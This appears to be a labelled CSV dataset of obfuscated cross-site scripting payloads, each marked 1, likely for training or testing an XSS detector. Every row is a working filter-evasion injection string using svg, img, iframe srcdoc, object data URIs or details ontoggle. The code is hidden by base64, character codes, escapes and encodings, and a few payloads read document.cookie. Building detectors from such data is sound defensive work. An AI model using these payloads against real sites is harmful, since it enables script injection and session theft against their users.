"<iframe srcdoc=""<svg onload=setTimeout('a\x6cert(1)') />"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](0b11)</script>"">",1
"<svg onload='eval(atob(""YWxlcnQoJzEyMycp""))'>",1
"<iframe srcdoc='<svg onload=eval(atob(""YWxlcnQoMSk=""))></svg>'></iframe>",1
"<iframe srcdoc='<svg onload=""window[&#39;al&#39;+&#39;ert&#39;](`XSS`)""></svg>'>",1
"<svg onload=setInterval('al'+'ert(1)',999)>",1
"<svg onload=setTimeout(atob(""YWxlcnQoMSk=""),0)>",1
<svg onload=window[unescape('%61%6c%65%72%74')](1)>,1
"<iframe src=""javascript:eval(atob('YWxlcnQoMSk='))""></iframe>",1
<img src=x onerror=window['al'+'ert'](`\x31`)>,1
"<object data='data:text/html,<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>'></object>",1
"<iframe srcdoc=""<img src=x onerror=window['\x65\x76\x61\x6c']('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout('al'+'ert(123)',0)</script>""></iframe>",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.cookie)')</script>"">",1
"<iframe srcdoc=""<details open ontoggle=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))></details>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[&quot;al&quot;+&quot;ert&quot;](1)>""></iframe>",1
"<svg onload=setInterval(window[String.fromCharCode(97,108,101,114,116)],1,1)>",1
"<iframe srcdoc=""<svg onload=alert(/XSS/.source)></svg>""></iframe>",1
<details open ontoggle=eval(atob('YWxlcnQoMSk='))></details>,1
"<svg onload=window[String.fromCharCode(0x61,0x6c,0x65,0x72,0x74)](1)>",1
<svg onload=eval(decodeURIComponent(`%61lert(1)`))>,1
"<iframe src=javascript:\u0065val(setTimeout(""\x61lert(1)"",1))>",1
<svg/onload='eval(atob(`YWxlcnQoJ1hTUyEnKQ==`))'>,1
"<iframe srcdoc=""<svg onload=window['setTimeout']('al'+'ert(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(unescape('%u0061%u006c%u0065%u0072%u0074%28%u0031%u0031%u0031%29'))>"">",1
"<svg onload='eval(Function(""return String.fromCharCode(97,108,101,114,116,40,49,41)"")())'>",1
"<iframe srcdoc=""<script>eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)</script>""></iframe>",1
"<svg onload=setInterval(atob('YWxlcnQoMSk='),100)>",1
"<iframe srcdoc=""<object data='data:text/html,<svg onload=eval(atob(&quot;YWxlcnQoMSk=&quot;))>'></object>""></iframe>",1
"<iframe srcdoc='<svg onload=setTimeout(""al""+""ert(1)"",0)>'></iframe>",1
<svg onload=eval(atob('d2luZG93LmFsZXJ0KDEp'))>,1
"<object data=""data:text/html;charset=utf-8,%3Csvg%20onload%3D%22window%5B%27al%27%2B%27ert%27%5D(1)%22%3E""></object>",1
<svg onload=window[atob('YWw=')+'ert'](1)>,1
<iframe srcdoc='<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))>'></iframe>,1
"<object data=""data:text/html,<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>""></object>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"">",1
"<svg onload=""eval(String['f'+'r'+'o'+'m'+'C'+'h'+'a'+'r'+'C'+'o'+'d'+'e'](97,108,101,114,116,40,39,88,83,83,39,41))"">",1
"<iframe srcdoc=""<img src=x onerror='setTimeout(`alert(44)`,0)'>"">",1
<iframe srcdoc='<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(5)`)>'></iframe>,1
"<iframe srcdoc=""<img src=1 onerror=window['al'+'ert'](1)>""></iframe>",1
"<iframe srcdoc=""<script>eval('al'+'ert(1)')</script>""></iframe>",1
"<iframe srcdoc=""<script>window['al'+'ert'](0o11)</script>"">",1
<img src=x onerror=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))>,1
"<iframe srcdoc=""<img src=x onerror=window['a'+'lert'](1)>""></iframe>",1
<svg onload=eval(`\x61\x6c\x65\x72\x74(1)`)>,1
"<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))',0)>",1
"<svg onload=setTimeout(Function.prototype.constructor('al'+'ert(1)'),0)>",1
<details open ontoggle=eval(atob('YWxlcnQoMik='))>,1
"<iframe src='data:text/html,<script>eval(atob(""YWxlcnQoJ0gzUicp""))</script>'></iframe>",1
"<iframe srcdoc='<img src=x onerror=setTimeout(atob(`YWxlcnQ=`)+""(1)"",0)>'></iframe>",1
<svg onload=window['al'+'ert'](1)></svg>,1
"<svg onload='((()=>{})[""constructor""](""al""+""ert(2)"")())'></svg>",1
"<svg onload=""&#x65;&#118;&#97;&#x6c;(unescape('%61%6c%65%72%74(%27%58%53%53%27)'))"">",1
"<svg onload=setInterval(String.fromCharCode(97,108,101,114,116)+'(1)',50)>",1
"<iframe srcdoc=""<img src=x onerror='eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)'>""></iframe>",1
"<iframe/srcdoc=""<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"">",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) />",1
<iframe srcdoc='<svg onload=eval(atob(&quot;d2luZG93WydhbGVydCddKDEp&quot;))>'></iframe>,1
"<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></details>",1
"<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",1
"<object data=""data:text/html,<svg onload=setTimeout('al'+'ert(1)',0)></svg>""></object>",1
"<svg onload='eval((()=>{const a=""alert"";return a+""(1)"";})())'>",1
"<iframe srcdoc=""<img src=x onerror=window[String.fromCharCode(97,108,101,114,116)](1)>""></iframe>",1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%34%29'))>,1
"<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+String.fromCharCode(40,49,41))>",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
"<object data=""data:text/html,<img src=x onerror=window['al'+'ert'](1)>""></object>",1
"<iframe srcdoc='<object data=""data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+""></object>'></iframe>",1
"<object data=""data:text/html,<script>window['al'+'ert'](5)</script>""></object>",1
"<iframe srcdoc=""<svg onload=window['a'+'l'+'ert'](1) />""></iframe>",1
<svg/onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+`rt(1)`)>,1
"<svg onload=""eval('al'+'ert(1)')""></svg>",1
"<svg onload=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))>",1
<svg onload=eval(decodeURI('%61%6c%65%72%74(1)'))>,1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97,108,101,114,116,40,53,41))</script>"">",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMSk='))>"" />",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(0x61,0x6C,0x65,0x72,0x74,40,49,41))>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>"">",1
"<object data=""data:text/html,<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>""></object>",1
"<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116)+""(1)"");>'></iframe>",1
"<iframe srcdoc=""<svg/onload=setTimeout(eval,0,decodeURIComponent('a%6cert(%2F1%2F)'))>"">",1
"<iframe srcdoc=""<script>window['al'+'ert']('1')</script>"">",1
"<svg onload='window[""al""+""ert""](18)'></svg>",1
<svg onload=window['\x61\x6c\x65\x72\x74'](1)>,1
"<iframe srcdoc=""<svg onload=window['al'+'ert'](1)>"" />",1
"<svg onload=eval(String.fromCharCode(97,108,101)+'rt(1)')>",1
"<iframe srcdoc=""<svg onload=window[`\u0061lert`](1)></svg>""></iframe>",1
"<iframe srcdoc=""<script>setTimeout(`alert(1)`, 0)</script>"">",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>""></iframe>",1
"<svg onload=window[String.fromCharCode(101,118,97,108)](decodeURIComponent('%61%6C%65%72%74(1)'))>",1
"<iframe srcdoc=""<img src=x onerror=eval('window'+'.alert(1)')>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>""></iframe>",1
"<svg onload=""setTimeout('eval(atob(\'YWxlcnQoMSk=\'))', 0)""></svg>",1
"<iframe srcdoc=""<svg onload=eval('al'+'ert(1)')>""></iframe>",1
<svg/onload=eval(atob('YWxlcnQoMSk='))>,1
"<iframe srcdoc=""<script>setTimeout(()=>{let a=atob('YWxlcnQoMSk=');eval(a)},0)</script>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>""></iframe>",1
"<iframe srcdoc=""<svg onload=Function('al'+String.fromCharCode(101,114,116,40,49,41))()>""></iframe>",1
"<svg onload='setInterval(function(){alert(1)}, 1000)'>",1
<iframe srcdoc='<svg onload=eval(atob(`YWxlcnQoMSk=`))>'></iframe>,1
"<iframe srcdoc=""<script>setTimeout(`alert(1)`,0)</script>""></iframe>",1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(7)'))>,1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMTIzKQ=='))></svg>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[`al`+`ert`](1)>""></iframe>",1
"<iframe srcdoc=""<svg onload=top['al'+'ert']('XSS')>"">",1
<svg onload=eval(`window['al'+'ert'](1)`)>,1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%77%69%6e%64%6f%77%5b%27%61%6c%65%72%74%27%5d%28%31%29'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('al'+'ert(1)',0)>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>"">",1
"<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))""></svg>",1
<details open ontoggle=window['al'+'ert'](1)></details>,1
<svg onload=eval(atob(&quot;d2luZG93LmFsZXJ0KDEp&quot;))>,1
"<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,54,41))'>",1
"<svg onload=setTimeout(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)',0)>",1
"<iframe srcdoc=""<script>eval('al\x65rt(111)')</script>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%61%6c%65%72%74%28%31%31%31%29'))>"">",1
"<object data='data:text/html,<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></svg>'></object>",1
"<iframe srcdoc='<img src=x onerror=window[""a""+""l""+""ert""](1)>'></iframe>",1
"<iframe srcdoc=""<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))'/>""></iframe>",1
"<svg onload=""top['\x65v\x61l'](String.fromCharCode(97,108,101,114,116,40,49,41))"">",1
<svg onload=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(1)')>,1
"<iframe srcdoc='<img src=x onerror=eval(atob(""YWxlcnQoMik=""))>'></iframe>",1
<svg onload=window['al\x65rt'](1)>,1
"<iframe srcdoc='<svg onload=window[String.fromCharCode(101,118,97,108)](""al""+""ert(1)"")>'></iframe>",1
"<iframe srcdoc=""<svg onload=eval(eval('Str'+'\u0069ng.fromCharCode')(97,108,101,114,116,40,49,41))>""></iframe>",1
<svg onload='Function(&#39;al&#39;+&#39;ert(11)&#39;)()'></svg>,1
"<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))'>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116)+'(1)')>""></iframe>",1
"<iframe src=""data:text/html,<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></body>"">",1
"<svg onload='window[eval(atob(""d2luZG93LmFsZXJ0KDEp""))]'></svg>",1
<svg onload=Function('al'+'ert(1)')()></svg>,1
"<details open ontoggle='window[[[""\x61"",""\x6c"",""\x65"",""\x72"",""\x74""].join("""")]](1)'></details>",1
"<svg onload='window[atob(""YWxlcnQ="")](1)'></svg>",1
"<svg onload=window[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))>",1
<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(111)')>,1
"<svg onload=setTimeout('window[String.fromCharCode(97,108,101,114,116)](1)',0)>",1
"<iframe srcdoc=""<img src=x onerror=window[atob('YWxlcnQ=')](1)>""></iframe>",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoJzEwMCcp'))</script>""></iframe>",1
<svg onload=window['\x65va\x6c']('ale'+'rt(1)')>,1
<svg onload=window['al\x65rt']((Math.random()+1).toString(36).substring(7))>,1
"<svg onload=""setTimeout(()=>{alert(String.fromCharCode(49,49,49))},0)""></svg>",1
"<svg onload=""window.setTimeout('alert(String.fromCharCode(88,83,83))',0)"">",1
"<iframe srcdoc='<img src=x onerror=setTimeout(`al`+`ert(1)`,0)>'></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) />""></iframe>",1
"<iframe src=""javascript:%61%6c%65%72%74%28%27%58%53%53%27%29""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
"<svg onload='eval(atob(""YWxlcnQoMTAwKQ==""))'>",1
"<iframe srcdoc=""<svg onload=window['a'+'lert'](1)>""></iframe>",1
"<svg onload=""new Function('a','alert(a)')(1)"">",1
"<svg onload=""eval(atob('YWxlcnQoMSk='))""></svg>",1
"<iframe srcdoc=""<svg onload=window[atob('YWxlcnQ=')](1)>""></iframe>",1
"<iframe src=""javascript:func=setTimeout;funp='ale';c=unescape('%72%74(1)');func(funp+c)"">",1
"<svg onload=""eval(atob('YWxlcnQoNzAp'))"">",1
"<iframe srcdoc=""<script>eval(atob('YWxlcnQoMTExKQ=='))</script>""></iframe>",1
<svg onload=eval(unescape('%61%6C%65%72%74%281%29'))></svg>,1
"<svg onload='new Function(""ale""+""rt(1)"")()'></svg>",1
"<iframe srcdoc=""<img src=x onerror=import('data:text/javascript,alert(1)')>""></iframe>",1
"<svg onload=window['ev'+'al'](String.fromCharCode(97,108,101,114,116)+'(1)')>",1
"<iframe srcdoc=""<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(atob(&#x27;YWxlcnQoMSk=&#x27;),0)>""></iframe>",1
"<iframe srcdoc='<svg onload=eval(""al""+""ert(1)"")>'></iframe>",1
<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>,1
"<svg onload=""\u0065\u0076\u0061\u006C('\x61\x6C\x65\x72\x74(7)')"">",1
"<iframe srcdoc=""<script>window.location='javascript:'+unescape('%61%6c%65%72%74%28%31%29')</script>"">",1
"<iframe sRcDoC=""<img src=x onerror=window[unescape(escape`alert`)](00)>""></iframe>",1
"<svg onload=eval('al'+String.fromCharCode(101,114,116)+'(1)')>",1
"<iframe srcdoc=""<script>eval([...'al\x65rt(1)'].join(''))</script>""></iframe>",1
<svg onload=\u0061\u006c\u0065\u0072\u0074(2)>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(2)'))>,1
<details open ontoggle=eval('al'+'ert(1)')></details>,1
"<svg onload=""eval(String['fr'+'omCh'+'arCo'+'de'](97,108,101,114,116,40,39,88,83,83,39,41))"">",1
<svg onload=window[unescape('%61%6C%65%72%74')](1)>,1
"<svg onload=""document.location=`javascript:alert\`XSS\``"">",1
<svg onload=window['a'+'lert'](1)>,1
"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",1
"<iframe srcdoc=""<script>window['al'+'ert'](4)</script>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116,40,49,41))',0)></svg>""></iframe>",1
